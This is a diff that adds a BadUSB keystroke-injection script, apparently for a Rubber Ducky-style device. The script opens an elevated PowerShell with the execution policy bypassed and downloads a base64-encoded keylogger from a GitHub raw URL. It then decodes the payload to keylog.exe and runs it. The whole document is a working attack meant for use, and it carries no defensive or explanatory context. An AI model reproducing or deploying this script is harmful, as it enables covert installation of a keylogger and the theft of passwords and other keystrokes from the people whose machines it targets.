@@ -1,0 +1,25 @@
+REM Open PowerShell with bypassed execution policy
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass' -Verb runAs
+ENTER
+DELAY 2000
+
+REM Download encoded executable
+STRING $url='https://raw.githubusercontent.com/Chrislundh98/BadUSB/main/Keylogger/b64keylog.txt'; $out='b64keylog.txt'; Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
+ENTER
+DELAY 1000
+
+REM Decode the file and save as .exe
+STRING $data=Get-Content -Path b64keylog.txt -Raw; $decoded=[System.Convert]::FromBase64String($data); [System.IO.File]::WriteAllBytes('keylog.exe', $decoded)
+ENTER
+DELAY 1000
+
+REM Execute the decoded .exe file
+STRING Start-Process -FilePath .\keylog.exe
+ENTER
+DELAY 500
+
+REM Close PowerShell
+STRING exit
+ENTER
